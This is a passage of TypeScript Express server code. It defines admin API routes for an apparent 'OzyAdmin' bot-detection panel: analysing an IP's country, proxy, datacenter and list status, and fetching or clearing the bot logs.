        ip,
        country: geo?.country || geo?.countryCode || "—",
        countryCode: geo?.countryCode || "??",
        allowedCountry: geo?.countryCode ? allowedCountries.includes(geo.countryCode) : false,
        datacenter: finalDatacenter,
        proxy,
        inWhitelist: whitelist.includes(ip),
        inBlacklist: blacklist.some((entry) => entry.ip === ip),
      });
    } catch (error) {
      console.error("[OzyAdmin] Analyze error:", error);
      return res.status(500).json({ error: "Failed to analyze IP" });
    }
  });

  /**
   * GET /api/ozyadmin/logs
   * Récupère les logs parsés + stats (format beta2)
   */
  app.get("/api/ozyadmin/logs", requireAdminAuth, async (req: Request, res: Response) => {
    const { limit = "50" } = req.query;
    
    try {
      const { logs, stats } = await getBotLogsWithStats(parseInt(limit as string, 10));
      return res.json({ logs, stats });
    } catch (error) {
      return res.status(500).json({ error: "Failed to load logs" });
    }
  });

  /**
   * POST /api/ozyadmin/logs/clear
   * Remet le compteur des détections à 0 (vide le fichier de logs)
   */
  app.post("/api/ozyadmin/logs/clear", requireAdminAuth, async (_req: Request, res: Response) => {
    try {
      await clearBotLogs();
      return res.json({ success: true, message: "Logs vidés, compteur remis à 0" });
    } catch (error) {
      return res.status(500).json({ error: "Failed to clear logs" });
    }
  });

  return httpServer;
}
